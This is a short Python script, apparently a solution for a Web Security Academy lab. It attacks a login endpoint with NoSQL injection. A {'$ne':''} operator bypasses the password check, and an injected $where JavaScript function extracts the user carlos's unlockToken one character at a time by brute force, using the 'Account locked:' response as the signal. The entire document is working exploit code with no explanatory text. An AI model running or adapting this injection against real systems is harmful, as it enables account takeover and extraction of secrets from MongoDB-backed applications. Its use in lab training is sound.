import requests
import string
import json

attack_payload = string.ascii_lowercase + string.digits
cookies = {"session": "W6LjSLYmXeEOw6gbvRTCWvsLk11bR3dc"}
# After bruteforcing, i found that the length of the unlockToken is 16
# unlockToken = "5d9b9907a9c00904"
unlockToken = ""
for i in range(0,16):
    print(f"Finding the {i+1} character")
    for char_payload in attack_payload:
        print("Trying : " + char_payload)
        response = requests.post("https://0a6f00eb0354bc39835b371c00fd00cb.web-security-academy.net/login", cookies=cookies, headers={"Content-type":"application/json"}, data=json.dumps({
            "username":"carlos",
            "password":{"$ne":""},
            "$where":f"function(){{if(this.unlockToken[{i}]=='{char_payload}')return 1;else return 0;}}"
            }))
        # print(response.text)
        if("Account locked:" in response.text):
            unlockToken += char_payload
            print("Find Unlock token : " + unlockToken)
            break